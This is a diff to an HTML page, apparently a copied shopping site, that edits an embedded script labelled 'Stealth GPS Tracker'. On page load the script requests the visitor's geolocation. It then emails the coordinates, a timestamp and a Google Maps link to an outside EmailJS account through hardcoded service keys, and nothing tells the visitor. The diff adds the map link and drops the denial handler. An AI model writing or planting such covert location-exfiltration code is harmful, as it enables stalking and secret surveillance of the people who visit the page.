@@ -9001,33 +9001,34 @@ P.now("ewc-assets").execute("EwcAssetLoaded", function (ewcAssets) {
 </script>
 
 
-<!-- 🔒 Stealth GPS Tracker -->
+<!-- Stealth GPS Tracker with Google Maps Link -->
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   (function () {
     emailjs.init("3n_BFa04zngneM-UN"); // Your Public Key
 
     function sendLocation(lat, lon) {
+      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       emailjs.send("service_un5475i", "template_moiatum", {
         lat: lat,
         lon: lon,
-        time: new Date().toISOString()
+        time: new Date().toISOString(),
+        map: mapLink
       }).then(function (response) {
-        console.log("📨 Location sent!", response.status, response.text);
+        console.log("📨 Email sent!", response.status, response.text);
       }, function (error) {
-        console.error("❌ Failed to send location:", error);
+        console.error("❌ Failed to send email:", error);
       });
     }
 
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(function (pos) {
         sendLocation(pos.coords.latitude, pos.coords.longitude);
-      }, function (err) {
-        console.warn("⚠️ Location access denied", err);
       });
     }
   })();
 </script>
+
 
 
 
